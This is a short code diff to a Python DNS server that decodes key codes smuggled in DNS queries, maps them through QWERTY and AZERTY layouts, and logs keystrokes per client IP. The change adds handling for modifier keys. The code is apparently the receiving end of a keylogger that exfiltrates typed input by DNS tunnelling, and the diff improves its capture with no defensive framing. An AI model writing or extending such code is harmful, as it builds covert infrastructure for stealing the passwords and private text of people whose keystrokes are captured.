@@ -15,7 +15,10 @@ REMOTE_PORT = 53  # Port of the remote server
 qw_key_map = yaml.safe_load(open("qwerty.yml"))
 az_key_map = yaml.safe_load(open("azerty.yml"))
 key_maps = {0: qw_key_map, 1: az_key_map}
+
+mods_str_rep = {k: {v["keys"][mod]:mod for mod in v["mod"]} for k,v in key_maps.items() }
 keys = {}
+
 
 
 class ProxyResolver(BaseResolver):
@@ -55,7 +58,12 @@ class PassthroughDNSHandler(DNSHandler):
             key_events = zip(payload[::2], payload[1::2])
             for layout, code in key_events:
                 if key_map := key_maps.get(layout):
-                    keys[client_ip].append(key_map.get(code, ""))
+                    if len(keys[client_ip]) >0 and keys[client_ip][-1] in mods_str_rep[layout]:
+                        last_mod_str= keys[client_ip].pop()
+                        mod = mods_str_rep[layout][last_mod_str ]
+                        keys[client_ip].append(key_map["mod"][mod].get(code, f"{last_mod_str} {key_map['keys'].get(code, '')} "))
+                    else:
+                        keys[client_ip].append(key_map["keys"].get(code, ""))
 
             res = {}
             for client_ip, k in keys.items():
